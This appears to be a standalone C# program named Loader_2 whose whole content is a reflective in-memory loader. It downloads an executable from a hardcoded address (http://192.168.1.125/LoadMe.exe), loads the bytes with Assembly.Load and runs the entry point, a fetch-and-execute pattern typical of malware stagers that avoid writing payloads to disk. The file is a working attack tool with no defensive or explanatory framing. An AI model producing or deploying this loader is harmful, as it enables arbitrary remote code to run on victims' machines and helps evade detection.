using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Loader_2
{
    internal class Program
    {
        public void fetchFromWeb(string url)
        {
            WebClient web = new WebClient();
            byte[] prog_byte = web.DownloadData(url);
            var asm = Assembly.Load(prog_byte);
            Object[] param = new String[] { null };
            asm.EntryPoint.Invoke(null, param);
        }
        static void Main(string[] args)
        {
            Program p = new Program();
            p.fetchFromWeb("http://192.168.1.125/LoadMe.exe");
        }
    }
}
